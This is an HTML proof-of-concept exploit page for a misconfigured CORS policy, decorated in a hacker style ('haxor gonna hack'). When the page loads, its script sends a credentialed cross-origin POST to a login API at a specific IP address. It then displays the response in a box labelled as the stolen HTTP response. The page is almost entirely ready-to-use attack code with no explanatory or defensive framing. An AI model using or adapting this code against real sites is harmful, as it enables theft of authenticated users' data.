<html>
<title>--==[[ CORS ]]==--</title>
<STYLE>
body {
    
background-position: center center;
background-repeat: no-repeat;
background-size: 400px 200px;
background-color: #000000;
background-attachment: fixed;
font-family: Tahoma
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: white;
width: 40%;
color: white;
}
input {
border            : solid 2px;
border-color        : #333;
BACKGROUND-COLOR: black;
font: 10pt comic sans ms;
color: white;
}
</STYLE>
<body bgcolor=black>
<div align=center>
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" style="border: dashed 2px #333">
<td width="100%" align=center valign="top" rowspan="1" >
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Arbitrary  Origin </font><font color=white size=5 face="comic sans ms"><b> mis-configured </font><font color=green size=5 face="comic sans ms"><b>CORS policy POC ]]==--</font> <div class="hedr">
<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
################################################</font><font color=white>################################################</font><font color=green>################################################</font><br>
</table>
</table> <div align=center><font size=4 color=white face="comic sans ms"><img src="https://www.technopat.net/sosyal/styles/default/xenforo/smilies/matrix.gif"> --==[[ haxor gonna hack ]]==-- 
<font color=white size=4 face="comic sans ms">        
<br># - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - # 
<br>
<script>
//Function which will make CORS request to target application web page to grab the HTTP response
function exploit() {
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
     var all = this.responseText;
     document.getElementById("load").innerHTML= all; // print the stolen HTTP response in division
     
      }
 };
 xhttp.open("POST", "https://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
 xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
 xhttp.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
 xhttp.setRequestHeader("Host", "139.224.42.111");
 xhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:97.0) Gecko/20100101 Firefox/97.0");
 xhttp.setRequestHeader("Accept-Encoding", "gzip, deflate");
 xhttp.setRequestHeader("Content-Type", "application/json");
 xhttp.setRequestHeader("userTempId", "0b5c72e4-eae9-423d-88ae-ed8df5c36683");
 xhttp.setRequestHeader("Content-Length", "32");
 xhttp.setRequestHeader("Origin", "http://139.224.42.111");
 xhttp.setRequestHeader("Connection", "Connection");
 xhttp.setRequestHeader("Referer", "Referer");

 xhttp.withCredentials = true;
 xhttp.send();
}

</script>
<body onload="exploit()">
<div align=center style="margin: 10px 20px 20px; word-wrap: break-word;">
Here goes stolen HTTP response 8-)<br> <br>
<textarea id="load" rows=10 cols=60 style="BACKGROUND-COLOR: black; color: white; border: 2px dashed #333;;"></textarea>
</body>
</html>
